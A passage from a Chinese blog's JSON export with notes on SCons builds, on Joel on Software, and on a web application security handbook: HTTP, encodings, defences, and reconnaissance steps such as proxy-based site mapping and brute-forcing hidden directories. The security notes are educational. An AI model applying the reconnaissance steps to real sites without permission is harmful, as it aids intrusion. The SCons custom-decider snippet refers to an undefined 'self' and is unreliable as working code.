函数显示的指示要构建静态库StaticLibrary(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;])# 构建动态库SharedLibrary(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;]) 链接库12345678910# 通过在 LIBS 参数中指定库的名称，并在 LIBPATH 指定库的路径，即可完成对库的链接# 此处先构建一个静态库Library(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;]) # 此处告知要链接的静态库名称和路径# 注意：只需要提供库的名称即可，无须在库的名称前面加上 lib 前缀，或者 .a 后缀什么的Program(&#x27;prog.c&#x27;, LIBS=[&#x27;foo&#x27;, &#x27;bar&#x27;], LIBPATH=&#x27;.&#x27;) 查找库1234567# 通常情况下，链接器只在系统默认的文件中查找库，但是通过 LIBPATH 参数# 链接器会在指定的文件夹中查找库Program(&#x27;prog.c&#x27;, LIBS = &#x27;m&#x27;, LIBPATH = [&#x27;/usr/lib&#x27;, &#x27;/usr/local/lib&#x27;])# 不同的路径可以使用逗号分隔，组成列表；也可以使用冒号连接成单个字符串LIBPATH = &#x27;/usr/lib:/usr/local/lib&#x27; 5. 节点对象在内部实现上，Scons 将所有的文件和文件夹都当作一个 NodeObject 节点对象来对待； 构建方法的返回值是节点列表所有的构建方法都会返回一个节点列表，用来表示将要构建的目标文件或者参与构建的源文件，返回的这个列表可以作为参数，传递给其他构建方法； 1234# 假设我们需要为两个目标文件指定不同的构建参数，因此我们为它们调用了各自的 Object 方法hello_list = Object(&#x27;hello.c&#x27;, CCFLAGS=&#x27;-DHELLO&#x27;)goodbye_list = Object(&#x27;goodbye.c&#x27;, CCFLAGS=&#x27;-DGOODBYE&#x27;)Program(hello_list + goodbye_list) 显式创建文件和目录的节点1234567# 创建文件节点和创始目录节点的方法不同# 创建文件节点使用 File 方法hello_c = File(&#x27;hello.c&#x27;)Program(hello_c)# 创建目录节点使用 Dir 方法classes = Dir(&#x27;classes&#x27;)Java(classes, &#x27;src&#x27;) 正常情况下，并不需要手动创建节点，因为构建方法会自动帮助创建；仅在需要显式传递节点参数给构建方法时使用； 12# Entry 函数可以根据参数类型，创建文件节点或者目录节点xyzzy = Entry(&#x27;xyzzy&#x27;) 打印节点的文件名称由于构建方法返回的是一个节点列表，因此如果要打印文件名称，很可能需要遍历它，或者使用索引访问它 12345object_list = Object(&#x27;hello.c&#x27;)program_list = Program(object_list)print &quot;The object file is:&quot;, object_list[0]print &quot;The program file is:&quot;, program_list[0]# 事实上此处的 object_list 是节点列表，仅仅是 print 函数将节点转成了字符串来代表文件名 获取节点文件名使用 Python 内置的 str 函数即可方便的将一个节点转成一个文件名，例如可以用来判断一个文件是否存在 12345import os.pathprogram_list = Program(&#x27;hello.c&#x27;)program_name = str(program_list[0])if not os.path.exists(program_name): print program_name, &quot;does not exist!&quot; 获取节点路径env 对象有一个 GetBuildPath方法，可以用来获取单个或多个节点的路径 123456# 创建一个 env 对象，它代表一个环境，在这个环境中，有一个环境变量的 VAR 的值为 valueenv=Environment(VAR=&quot;value&quot;)# 生成一个文件节点n=File(&quot;foo.c&quot;)# 调用 env 对象的 GetBuildPath 方法，获取节点列表的路径列表print env.GetBuildPath([n, &quot;sub/dir/$VAR&quot;]) 12# 打印结果为[&#x27;foo.c&#x27;, &#x27;sub/dir/value&#x27;] 除了使用 env 对象的 GetBuildPath 方法外，也有一个函数版本的 GetBuildPath ，它使用全局环境； 6. 依赖出现更新判断文件是否更新如果源文件的内容没有出现更新，是 Scons 不会重复构建已经完成构建的文件，这样可以节省大量的构建时间，不需要每次都从头开始构建每一文件； 使用 MD5 判断SCons 使用 MD5 来判断某个文件的内容是否发生了更新，当然，也可以另外配置让其使用文件时间戳来判断，甚至可以使用单独的 python 函数来进行各种自定义的判断； 使用 MD5 有一个好处是它只判断内容中的正文部分，同时忽略注释部分，即只要正文内容的构建结果不会出现变化，则 SCons 就不会重现构建它； 使用时间戳判断如果想使用时间戳来判断文件是否发生更新，则只需要调用 Decider 函数进行设置即可 123Object(&#x27;hello.c&#x27;)# 将判断方法设置为使用时间戳Decider(&#x27;timestamp-newer&#x27;) 普通的时间戳存在一个问题，即某个文件如果从仓库签出了一个旧版本，由于它的时间戳比当前的目标文件更早，所以不会判断为出现更新，导致编译错误；针对这种情况，可以使用 timestamp-match 规则来进行判断 123Object(&#x27;hello.c&#x27;)# 使用 timestamp-match 规则进行判断，只要时间戳不吻合，即需要重新构建，不管新旧Decider(&#x27;timestamp-match&#x27;) 使用混合规则仅当文件的时间戳出现了变化，再去计算文件的 MD5 值是否发生了变化，这样性能更好； 123Program(&#x27;hello.c&#x27;)# 使用混合的规则Decider(&#x27;MD5-timestamp&#x27;) 自定义规则可以自己写一个判断规则的函数，然后传递给 Decider 即可 123456789Program(&#x27;hello.c&#x27;)def decide_if_changed(dependency, target, prev_ni): if self.get_timestamp() != prev_ni.timestamp: dep = str(dependency) tgt = str(target) if specific_part_of_file_has_changed(dep, tgt): return True return False Decider(decide_if_changed)","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"Joel on software","slug":"Joel on software","date":"2020-12-06T10:32:00.000Z","updated":"2024-09-22T23:08:43.603Z","comments":true,"path":"2020/12/06/Joel on software/","permalink":"http://example.com/2020/12/06/Joel%20on%20software/","excerpt":"","text":"商业模式Joel 提到了两种商业模式 微软式的：前者进入的是一个充分竞争的市场，因此需要找好自己的定位，一步一个脚步的去慢慢发展自己，没有快速增长的可能性； 亚马逊式：后者进入的是一个几乎没有竞争者、有规模效应或网络效应的市场，因此需要在前期大量花钱快速占领市场份额，因为最后只有一个公司会生存下来； Joel 这个分析很有道理，它让我不得不思考自己的公司将来要如何定位自己的方向和模式； 鸡和蛋的问题有些商业模式会遇到先有鸡和先有蛋的问题，Joel 给出的意见是提供向后兼容性，这样就可以破解这个问题，他说得很有道理； 他举了几个例子： MS-DOS 系统对 CP&#x2F;M 上的文字处理软件的兼容性； PayMyBills 在开始时先让客户的账单寄送到自己的地址，然后为客户人工扫描成电子版； 如何阅读别人的代码关键：放慢阅读的速度； 原因：同样长度的编程语言包含的信息量，要远大于普通的语言；但人们总是习惯是普通语言的阅读速度，学尝试阅读代码，这会让他们很挫败。因此人们总是倾向于重写代码，但这其实这将花费更多的时间； 方法： 结队：和另外一个同事结队工作；将看到和想到的东西，大声说出来； 讨论：如果不同意或不明白对方的意思，马上要求对方进行解释； 跳过：有时候看不明白中间的某个东西，可以暂时跳过，等看完头尾后，再回来重新看中断部分，这个时候很有可能就看懂了； 宏观与微观：从微观的角度，将单行代码翻译成普通语言；然后从宏观的角度，将整段代码翻译成普通语言； 产品竞争策略如果产品进入的是一个已经被竞争对方完全占领的市场，那么就会面临如何让用户切换到使用自己的产品的问题； 用户的切换是有成本的，应提前罗列出每一个用户可能遇到的困难，并为它们想好对策，消除任何可能的障碍；避免用户在切换过程中，因为遇到困难而放弃了； 同时还要考虑如何让用户能够切换回旧的方式也很重要；例如 EXCEL 的例子；切换的过程不是一夜间全部发生的，而是一个陆续渐进的过程，这意味着即期有一部分尝鲜的客户很喜欢 EXCEL，他们也将面临一个障碍，即他们生成的 EXCEL 无法被同事或者客户打开；针对这个情况，EXCEL 为用户提供了兼容性，即可以将 EXCEL 存储成 LOTUS123 的版本； 如何吸引人才 为他们提供舒适的、有吸引力的工作环境； 去除在招聘过程中任何可能让候选人感到一丝丝犹豫的障碍； 提供金钱之外的一些福利（由于批量采购的关系，福利实际比表面上的价格更省钱，至少省一半）； 以可接受的薪资成交，然后第二天再告知提高5%，让其心怀感激； 五个为什么与清单人的大脑是不可靠的，而黑天鹅事件是不可预估的，因此通过五个为什么的方法，找到问题发生的根本原因； 将避免问题再次发生的操作写到工作清单中，让后续的每一次操作，都能够对照清单来执行，就像飞行员开飞机一样； 让清单代替大脑的思考，避免遗漏； 想赚钱别怕脏帮客户解决的问题越是困难，其价值就越大，同时也意味着能够赚到更多的钱； Office 复杂的文件格式完全搞懂复杂的东西可能要付出很大的代价，一种变通的方法是把它封装起来，在需要的调用它即可，这样可以实现复杂性的隔离； 管理方法提供愿景和使命，反复传播这些使命，让大家认同；激发每个人内心想变成更好的自己的欲望，变成由内部激励来驱动自己的工作，而不是从外部激励，因为那样很容易导致动作变形； 寸土必争不放过每一个可以改进的小小细节，当积累到足够多数量后，它就会产生质变，让最终产品一眼看上去，就呈现出一种卓越的精品特质； 少即是多不要给用户太多选择，因为人的大脑容量有限；选择太多的话，反而增加了决策的成本和负担，这样容易让用户感到无法胜任的无力感和不开心； 易用性的优先级不解决问题的产品，易用性再好也是徒劳；能够解决问题的产品，是讨论易用性的前提；易用性确实是非常重要，它有助于留下更多的用户数量，但首先要有用户愿意进来； 社区在工作和家庭之外，人们需要第三种空间。以前这些空间是实体的，如咖啡馆、酒吧、球馆等；现在这些空间变成虚拟的了；社区空间需要管理，否则它将会出现公地悲剧。总是有一些人自私的人，为了自己的利益，不惜牺牲他人，注意管理好他们；因为在社区中，有价值的总是少数人，多数人并不能贡献什么有趣的内容。但千万不要让那些无趣的人，把有价值的少数人给逼走了； 人们对社区有一种基因上需求，这方面有待读一些社会心理学方面的书籍进行深入了解； 开发时间规划对于大的任务，我们估算的时间将非常不准确，因此不要以大任务为单位估算它们。应该将大任务，按照实现的步骤，拆分成多个小任务；这些小任务必须要非常小，小到可以在以小时为单位的时间内完成。之后将小任务的完成时间累计起来，就会得到大任务的完成时间； 事后记录小任务的实际完成时间，调整它在脑海中的概念，做为下一次估算的依据，这样一段时间下来，估算就越会越来越准确； 异常处理原则： 自己写的代码不要让它会抛出异常，这样后续调用它们时，就完全不用担心它们会抛异常，因此也不需要额外的去处理它们； 调用别人写的代码时，因为不知道它们是否会抛异常，因此，在调用它们的地方，直接写上异常处理的办法，即当场 try…catch…，不留任何的后患； 性能由于摩尔定律的存在，性能是开发软件过程中，考虑的优先级最低，因为即使短期内面临性能障碍，也很快会被硬件的不断进步所解决； 创办公司提供最好的条件-&gt;找到最好的人-&gt;生产最好的产品-&gt;利润 点子和想法并不重要，因为只要有了优秀的人，他们自己会生产点子； 办公室设计设计师：Roy Leone 足够多的电源接口，有20个； 八口的交换机，方便给多台电脑提供有线连接； 预置布线槽，隐藏杂乱的电线； 条型办公桌，方便结队编程； 三面窗，两面采光； 电脑桌墙上有一个可以看到隔壁办公室窗户的窗口（相当于每扇窗户被三个办公室共用）； 有休息区和娱乐区，让办公室比家更舒适和方便； 源代码软件并不开源，但向客户提供源代码，这样当他们发现问题时，也可以尝试自行修复，之后将修复的代码合并进来，以便后续版本升级时，客户不会被影响； 简化性重点是每个功能都能够帮客户解决问题，这样每个功能都能够带来收入；虽然 80&#x2F;20 真的存在，但不同客户之间的 20% 并不相同；仅开发只有 20% 功能的精简版，但极大的影响收入来源； 重构与推翻当一个软件已经上线运行一段时间后，例如1年，由于各种历史的原因，在一开始的时候埋下了一些错误，它有可能变得难以维护。这时候千万不要推翻重来，而是先要各种简单容易的重构，例如将代码按规范格式化、将大函数拆成小函数、优化成有意义的变量名称等；这些工作都非常小，也不容易引入错误，同时也不会影响现有软件的运行。 当这个工作持续到一定的程度，代码就会在不知不觉变得好了起来，相比推翻重来，它将省下大量的时间，因为它并不触及到对原有核心代码的修改，却让代码变得容易维护了。 客服支持客户遇到问题，你帮他解决了，客户实际上变得比没有问题时还要满意。 无理由退款90天内，无偿退款。即使超过了90天，也仍然可以退款，任何时候，都可以退款。 原因：确实有人会退款，但是那只占很少的比例。但是由于有无限制的退款策略，会让下单的人感觉到很放心，因此试用的人反而会去增加很多很多，因为他们没有任何的决策成本。 发布策略在完成一个比较成熟的软件版本前，先不要大规模的宣传，而是寻找一些愿意尝鲜的客户，让他们先试用产品，帮助他们解决问题，然后在这个过程中不断完善产品，直到 2.0 版就绪；因为面市的是一个不成熟的产品，那么人们会留下不好的第一印象，之后很难改变人们的第一印象，即使后续软件已经改进了，他们也不愿意再做一次尝试； 发布频率软件不适宜过于频繁的发布，因为它可能导致用户经常处于学习的状态中，导致想起他们的反感。每隔一段时间再集中发布一次，并且在界面样式上能够感觉到更新，这样用户会不自觉的发现有变化，然后在使用的过程中会小心一点； 确定优先级 罗列所有待开发的功能； 用1到10为每个功能的开发成本打分，区分小型任务、中型任务、大型任务； 给每个人有限的预算，例如 50 元，让他们购买他们想要的功能； 每个功能的销售额除以成本，得到投入产出比； 按投入产出比从大到小，作为开发顺序；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"思考","slug":"思考","permalink":"http://example.com/tags/%E6%80%9D%E8%80%83/"}]},{"title":"黑客攻防技术宝典","slug":"黑客攻防技术宝典","date":"2020-12-05T02:18:00.000Z","updated":"2024-09-22T23:08:43.594Z","comments":true,"path":"2020/12/05/黑客攻防技术宝典/","permalink":"http://example.com/2020/12/05/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%AE%9D%E5%85%B8/","excerpt":"","text":"1. Web应用程序案例与风险Web应用程序的发展历程早期Web服务器仅提供静态内容，可以被任意人公开访问；今天则完全变了，Web服务器可以提供非常丰富的服务； Web应用程序安全虽然很多站点声明自己是安全的，但实际上并非如此。超过一半以上的安全存在各式各样的漏洞； 不完善的身份验证措施：62%； 不完善的访问控制措施：71%； SQL 注入：32%； 跨站点脚本：94%； 信息泄露：78%； 跨站点请求伪造：92%； 核心安全问题：用户可提交任意输入用户在浏览器事实上拥有无限的权限，因此可以提交任意非开发者预期的内容，而开发者需要假设所有的输入都可能是恶意的，并进行防范； 关键问题因素以下几点原因让问题变得更加严重了： 不成熟的安全意识 独立开发 欺骗性的简化； 快速发展的攻击技术； 资源与时间限制； 技术上强其所难； 对功能的需求不断增加； 新的安全边界早期安全边界在于防火墙层级，但随着Web应用程序的功能变得更加模块后，需要访问操作系统中或者之间不同功能模块，例如数据库，使得安全边界问题缩小到了Web应用程序内部； Web应用程序安全的未来暂时还没有迹象显示安全问题能够在不远的未来得到解决，因为整个行业远未形成成熟的意识或者能力； 2. 核心防御机制处理用户访问多数Web应用使用以下三种安全机制处理用户访问，但由于这三个机制之间相互依赖，因此导致它们不能达到预期的安全保护目标； 身份验证 会话管理 访问控制：由于这方面的控制相当复杂，因此一般存在大量的安全漏洞； 处理用户输入输入的多样性有些字段有特殊格式的输入要求，但有些字段，例如文章、备注等，则需要允许各式各样的输入值； 当探查到用户的非法输入，正常应该拒绝用户提交的，并将事件记录到日志文件中，以便随后进行调查； 输入处理方法拒绝已知的不良输入通常是使用一个黑名单，包含一组攻击中会使用的模式，阻击任何与黑名单匹配的数据；但这种方法的效率不同，也存在各种绕过的方法； 接受已知的正常输入使用一个白名单；这种方法比黑名单要好得多，但有时候有些字段存在迫不得已的情况，例如用户的姓名； 净化即在开始处理数据之前，先对数据进行净化，删除或转义可能存在的恶意字符；这种方法一般非常有效；不过在一个输入项中容纳多个可能的恶意数据时，有时不能完全净化成功； 安全数据处理通过确保处理的过程绝对安全，例如在数据库查询过程中使用参数化查询以避免 SQL 注入攻击；这也是一项有效的通用方法，不过不能够适用于Web应用程序需要执行的每个操作； 语法检查攻击的输入是正常的，但输入的用途是非法的，例如伪装成他人的账号； 边界确认由于Web 应用程序提供的功能很广泛，因此不同功能组件之间并不存在一个统一的安全边界，需要具体情况具体处理，每个功能组件执行自己的安全检查； 多步确认与规范化Web应用程序有时会对用户输入进行多步的确认，或者做一些规范化的操作，此时攻击者可以专门设计一些针对这些操作的输入字符，以避开检查机制； 处理攻击者常见措施： 处理错误 维护审计日志； 向管理员发出警报； 应对攻击； 处理错误避免向用户返回任何由系统生成的错误信息，因为它们将非常容易被攻击者有效利用；一般使用 try…catch 机制来生成自定义的错误信息，并将异常情况记录到日志中，以便后续进一步检查处理； 维护审计日志在任何注重安全的应用程序中，日志应记录所有重要事件，这些事件至少包括： 所有与身份验证功能相关的事件，如成功或失败的登录，密码修改等； 关键交易，例如信用卡支付与转账； 被访问控制机制阻止的访问企图； 任何包含已知攻击字符串，公然表明恶意意图的请求； 有效的审计日志一般会记得每个事件的发生时间、发出请求的IP地址、用户的账号等信息；这些信息需要进行严格的保护，避免未授权的读取或写入访问。一般来说，需要将它们存储在单独的系统中，仅允许主应用程序访问，或者存储在一次性写入的介质中；如果这些日志被攻击者利用，将可能使攻击者立即攻破整个应用程序； 向管理员发出警报警报监控的反应事件一般包括： 应用反常：如收到由单独一个IP 地址或用户发出的大量请求（表明应用程序正受到自定义攻击）； 交易反常； 包含已知攻击字符串的请求； 请求中普通用户无法查看的数据被修改； 由于每个应用程序实际业务场景各不相同，因此最好的警报机制，是根据当前业务场景，判断哪些输入是普通用户不可能出现的，然后与警报机制整合，第一时间发出警报； 应对攻击当发现攻击者时，应当设计能够采取自动反应的措施，以阻止攻击进行探查，例如对其提交的请求的响应速度变缓慢，或将其加入黑名单1-2天，或者终止攻击者的会话，要求其重新登录等； 当然，最重要的事件还是应该立即修复应用程序中存在的所有漏洞； 管理应用程序很多应用程序使用相同的 Web 界面在内部执行管理功能，但是它无形中也变成一个主要的攻击目标，因为攻破这个界面后，能够有效提升权限； 3. Web应用程序技术HTTPHTTP 请求头部中的一些字段： Referer：用来表示发出请求的原始 URL； User-Agent：用来显示发出请求的客户端（如浏览器）的信息 Host：用来显示被访问的 URL 中的主机名称； Cookie：用来显示服务器向客户端发送的参数； HTTP 响应中的一些字段 Server：用来显示服务端所使用的服务器程序，例如：Apache、Nginx、 Microsoft-IIS等； Pragma：用来告知浏览器不要缓存结果（适用于动态资源的场景）； Expires：用来告知浏览器当前资源的过期时间； Content-Type：用来告知浏览器主体的内容类型，以便浏览器可以正确解析； Content-Length：用来告知浏览器主体的长度； HTTP 方法由于 GET 请求会将请求参数显示在 URL 中，并且可以存储在书签或是放在请求头部的 Referer 字段中，因此应避免使用查询字符串传送任何敏感的信息； 其他方法： TRACE：当使用该方法访问某个资源时，服务端会在响应的主体中返回其收到的客户端的具体请求内容；因此，客户端可以用它来诊断自身发出的请求是否在中途被窜改了； OPTIONS：用来向服务端询问某个资源允许的操作方法；服务端会在返回的响应的头部 Allow 字段中列出可执行的方法； HTTP 还有其他一些允许的方法，如果服务端激活的方法越多，则面临被攻击的风险越大； URL常用的 URL 是绝对路径的格式，但其实也支持使用相对路径的格式； RESTREST 风格的 URL 一般是指将查询参数放在路径中，而不是放在查询字符串中； HTTP 消息头常用消息头： Connection：告知对方在完成 HTTP 传输后，如何处理当前的 TCP 连接状态，例如保持开放，或者直接关闭； Content-Encoding：为消息主体中的内容指定编码格式，例如 gzip（很多应用会使用该格式来压缩响应主体中的内容，以提高传输的速度）； Transfer-Encoding：为某段传输指定编码格式（一个 HTTP 连接可以分成多段传输，每一段的消息可以使用不同的编码格式，例如：chunked、compress、deflate、gzip、identity等）； 请求消息头 Accept：客户端用它来告知服务端自己可以接收哪些类型的内容，例如图片、文档等； Accept-Encoding：用来告知服务端，客户端可接受的内容编码方式； Authorization：提供服务端所要求的认证类型和认证信息，例如：basic类型+用户名+密码，需要配合 HTTPS 使用，不然等同于明文传输账号密码； If-Modified-Since：用来告知服务端浏览器最后一次收到当前所请求资源的时间；如果在那个时间之后，资源并未出现变化，则服务端不需返回资源内容，只需要返回304编码，告知客户端之前的缓存仍可用； If-None-Match：用来告知服务端，如果服务端没有任何资源与该字段的 Etag 值匹配，则应返回所请求的资源，否则则无须返回，浏览器将使用本地的缓存； Origin：用来告知服务器当前请求来自于哪个站点，该字段一般用于跨域 Ajax 请求中； Referer：用来告知服务器表明当前请求所来源页面的地址； 响应消息头 Access-Control-Allow-Origin：用来告知客户端是否允许跨域请求当前的资源； ETag：为当前资源设置一个唯一标签，后续客户端可以使用该标签，向服务端询问所请求的资源是否已经过期； Expires：用于告知客户端当前资源的过期时间； Location：用来告知客户端资源重定向的目标地址，一般配合 3 开头的状态码使用； Pragma：用来告知浏览器如何处理缓存，例如：no-cache； Server：用来告知客户端，服务端当前使用的是什么样的服务器软件； Set-Cookie：服务端用来向客户端发送 cookie 值； WWW-Authenticate：服务端用其来告知客户端自己支持哪些身份验证方式，一般配合 401 状态码使用； X-Frame-Options：服务端用其来告知客户端如何加载当前响应； cookiecookie 一般由一个键值对构成，但也可包含任何不含空格的字符串；可以在服务器响应中使用几个 Set-Cookie 消息头发布多个 cookie；客户端也可以在 Cookie 消息头中用分号分隔不同的 cookie； 服务端发出的 Set-Cookie 消息头中，还可以包含一些额外的属性，以指示客户端如何处理使用 cookie， 包括： expires：用来设定 Cookie 的有效时间；如果没有值，则浏览器不会永久保存当前 cookie，仅用于当前浏览器会话中；如果有值，则浏览器会将 cookie 值在本地存储下来，并在随后的浏览器会话中重复使用； domain：用来指定 cookie 可以有效使用的域；指示客户端仅可以将 cookie 用于 domain 所指定的域； path：用于指定 cookie 可以使用的路径； secure：限制只在 https 请求中使用 cookie； HttpOnly：用来限制客户端无法使用 JavaScript 直接访问 cookie； 状态码每条 HTTP 响应消息都会在它的第一行中包含一个状态码，状态码主要分为五类： 1开头的：提供信息 2开头的：请求被成功处理； 3开头的：请求被重新定向到其他资源； 4开头的：请求中包含错误； 5开头的：服务器在处理请求时发生错误； 常见的状态码 100 Continue：已收到请求的消息头，但主体还没有完整收到，客户端应继续发送余下的主体，待全部收到后，将返回新的响应； 200 Ok：请求已成功处理，并在响应中返回了请求结果； 201 Created：请求已成功提交； 301 Moved Permanently：所请求的资源已经永久性的转移到一个新的地址，新地址放在 Location 字段中，客户端后续应使用这个新地址来访问相应的资源； 302 Found：所请求的资源临时转移到了一个新地址，新地址放在 Location 字段中；但转移只是临时的，后续请求该资源应仍然使用旧地址； 304 Not Modified：在客户端的请求中，会有一个 If-Modified-Since 字段，记录着客户端上一次收到该资源的时间，服务端根据这个时间，判断在那之后，资源是否发生过修改，如果没有修改，就可以发回 304 响应，告知客户端所请求的资源未更新，让客户端使用缓存中的资源副本；另外客户端也可以在请求首部中使用 If-None-Match 字段，并在该字段中放上资源的 Etag 值，如果服务端发现存在相同 Etag 值的资源，则返回 304 响应；如果不存在，则返回所请求的资源； 400 Bad Request：表示客户端提交了一个无效的请求； 401 Unauthorized：表示客户端的请求没有验证成功，同时服务端会在响应的 WWW-Authenticate 字段中放上如何验证的信息； 403 Forbidden：表示所请求的资源绝对禁止访问，有身份验证也不行； 404 Not Found：表示所请求的资源不存在； 405 Method Not Allow：表示所请求的方法不支持； 413 Request Entity Too Large：表示请求的主体过长，服务端无法处理； 414 Request URI Too Long：表示请求的地址过长，服务端无法处理； 500 Internal Server Error：表示服务端在处理请求时遇到错误； 503 Service Unavailable：表示服务端的服务器程序虽然运转正常，但处理请求的应用程序无法作出响应； HTTPSHTTPS 跟 HTTP 一样，也属于传输层的协议，但是它使用 TLS&#x2F;SSL 对传输的数据进行了加密； HTTP 代理当使用 HTTPS 和使用代理向服务端发起请求时，客户端无法和代理服务器完成 TSL 握手，因此，代理服务器只能被当作 TCP 中继来使用；这意味着如果能够控制代理服务器的话，就能拦截并修改客户端和服务端之间的请求和响应数据；这将非常有用（原因在于可以控制浏览器发出的请求，并分析和修改服务器返回的响应；多数渗透测试工具都是以代理服务器的形式来运行）； HTTP 身份验证HTTP 身份验证有内置自己的身份验证功能，包括： Basic NTLM Digest 由于 HTTP 内置的验证功能，会将服务端要求提供的验证身份信息（如密码）放到消息头部中，因此如果不使用 HTTPS 连接的，这种验证方式将会是很危险的，因为如果请求被拦截的话，就会导致验证信息暴露；如果使用了 HTTPS，则这种验证方式就没那么危险； Web 功能服务器端的功能相对于互联网早期，服务器端提供的资源已经从以静态为主，变成了以动态资源为主，同时针对 Web 应用程序的开发也出现了各式各样的工具，了解这些工具，研究它们的漏洞，将十分有助于找出它们的案例隐患； 常用的服务端开发工具或平台包括： Java ASP.Net PHP Ruby On Rails SQL XML Web 服务 客户端的功能常用的浏览器开发工具或技术： HTML 超链接 表单 CSS Javascript VBScript 文档对象模型 Ajax JSON 同源策略：从相同站点收到的内容，可以访问并修改该站点的其他内容；但不能访问或修改不同站点的内容；这个策略由浏览器实现； HTML5 Web2.0 浏览器插件 状态与会话会话即可保存在服务器端，也可以保存在客户端；保存在服务器端的话，则需要给客户端发送一个令牌；保存在客户端则可以减轻服务器的负担；但是保存在浏览器端的数据有可能被用户修改，因此在将数据发给客户端保存之前，一般会使用一个只有服务端才知道的值，对数据做散列值计算，之后将数据和散列值都发给客户端；客户端需要在下一次请求中同时携带会话数据和散列值，如果会话数据被修改了，则服务端对会话数据进行计算的散列值和用户提供的散列值将无法匹配（如果会话是存储在服务器端的话，就没有这个必要了，直接将散列后的会话 ID 发给客户端即可；之所以要做散列，目的是让客户端无法猜测出来其他会话 ID，以避免客户端冒充他人）； 编码方案客户端发送给服务器的数据一般需要使用某种编码方案，服务器端在数据后，按照指定的方案对数据进行解码；因此，如果客户端操纵编码方案，有可能会让看似无害的信息，编码成另外一种解释； URL 编码URL 的编码方案使用 ASCII 字符集中的可打印字符对数据进行编码；该编码方案以 % 开头； %20 代表空格，另外 + 加号也代表空格； 有些字符是 URL 编码方案的保留关键字，因此如果在请求内容中使用这些字符，则需要对这些字符进行编码的转换，不然会被识别成关键字；包括：空格、%、？、&amp;、；、+、# 等； Unicode 编码Unicode 编码以 %u 开头，之后是用十六进制表示的编码，例如 %u2215 表示斜杠 “&#x2F;“； Unicode 的编码长度统一是4位的十六进制，相当于 16 位的二进制，或许也可叫做 UTF-16； UTF-8 则是一种长度可变的编码方案，它有可能只有一个字节，也有可能有多个字节；由于大部分字符是不常用的，如果将常用的字符用短编码来表示的话，则将会大大减少编码后的内容长度，提高传输效率； HTML 编码在 HTML 文档中，由于 HTML 语言也有一些保留的关键字，因此如果在内容中使用了这些关键字，就需要对其进行 HTML 编码，以便不会识别成关键字； HTML 编码使用了三种编码方案，都是以 &amp; 开头，包括： 实体：例如 &amp;quot 表示双引号，&amp;apos 表示单引号，&amp;amp 表示 &amp;； 十进制：以&amp;# 开头并加上字符的 ASCII 编码，例如：&amp;#34 表示双引号，&amp;#39 表示单引号 十六进制：以&amp;#x 开头，并加上字符的 ASCII 编码的十六进制数，例如：&amp;#x22 表示双引号，&amp;#x27表示单引号； Base64 编码Base64 编码使用 ASCII 中的可打印字符集合对内容进行编码，一般使用于邮件附件的编码，有时也用于 HTTP 内置的验证机制中对用户密码进行编码； Base64 使用的可打印字符集很少，包括以下 26个英文大写&#x2F;小写字母，数字0-9，还有加号”+”、斜杠”&#x2F;“，其他就没有了，总共是64个字符； 计算机中的数据是以字节表示的，每个字节由8个二进制位构成，因此每三个字节就会有24个二进制位；24个二进制位可以分成4组，每组6个二进制位，每组用一个 Base64 字符来表示，这样每 3 个字节就可以转换成 4 个Base64 字符来表示； 因此，只需要将待转换数据的字节总数是 3 的倍数（不足时使用等号 &#x3D; 进行凑齐），就可以将其他转换成 Base64 字符来表示； 即使对一段数据进行细微的修改，则转换后的 Base64 编码也会出现很大的差别，但是由于它使用等号来凑齐字符，因此很容易被识别出来是 base64 编码方案，导致失去防患效果； 十六进制编码用 ASCII 字符表示十六进制数据块，例如：daf 表示为 646166 序列化框架工具使用一些框架对待传输的数据进行序列化，这些框架包括： Flex 和 AMF Silverlight 和 WCF Java 序列化对象 4. 解析应用程序步骤： 枚举应用程序的功能 分析其核心安全机制和使用的技术，以暴露其主要的受攻击面； 发现可供利用的漏洞； 枚举内容与功能Web自动抓取通过爬虫工具将应用程序的所有页面抓取下来；常见的免费工具包括： Burp Suite WebScarab Zed Attack Proxy CAT 有些网站会在其根据目录放一个 robots.txt 文件，用来告知爬虫或者搜索引擎其不想被列入索引的 URL，不过这有时反而变成一个突破口，让攻击者能够快速发现一些可抓取的目标； 爬虫的自动抓取还是比较简单和机械的，它不过是不断探查每个页面中存在的超链接，然后不断向新链接发起请求，如果链接中有表单，它就伪造一些数据进行表单的提交；直到抓取完所有页面链接为止； 自动抓取工具的一些不足 无法处理动态生成的链接； 无法抓取存放在对象中的链接； 无法应对输入检查； 每个链接只请求一次，但实际上相同链接，使用不同请求参数可能返回不同的内容； 无法应对 URL 中的随机数，会造成死循环； 无法应对身份验证机制； 用户指导的抓取在客户端和服务端之前设立一道拦截器，然后由用户人工浏览网站，做一些动作，之后拦截器根据拦截到的数据生成站点地图；这种方式可以克服前面自动抓取的多项不足； 渗透测试步骤 配置浏览器，使用 Burp 或 WebScarab 作为本地代理服务器； 以常规方式浏览整个应用程序，访问发现的每一个链接，提交每一个表单并执行全部多阶段功能；分别在 javascript 启用与禁用、cookie 启用和禁用的情况下进行浏览； 检查由拦截工具生成的站点地图，找出手动浏览时没有发现的所有隐藏内容和功能，通过浏览器访问这些内容，以便拦截工具获得服务器的响应，从而确定其他所有内容；递归执行上述步骤，直到无法再找出新内容为止； 先将可能会导致会话中断的 URL 排除掉，然后基于余下的内容，让爬虫主动抓取站点内容； 发现隐藏的内容常用的隐藏内容有： 不同权限的用户登录后看到不同的内容； 上线后未删除的开发测试功能或者调试功能； 备份文件 文件快照的备份档案； 已部署但未上线可用的新功能； 已部署但对部分用户不可见的功能； 尚未从服务器上删除的旧版文件； 配置和包含敏感数据的文件； 当前应用程序功能的源文件； 包含有效用户名、会话令牌、被访问的 URL 以及所执行的操作的日志文件； 源代码中可能包含的用户名和密码等信息； 蛮力技巧通过发送大量的请求，包含常见的目录名称，收集服务器的响应，来猜测隐藏功能的名称和标识符； 渗透测试步骤 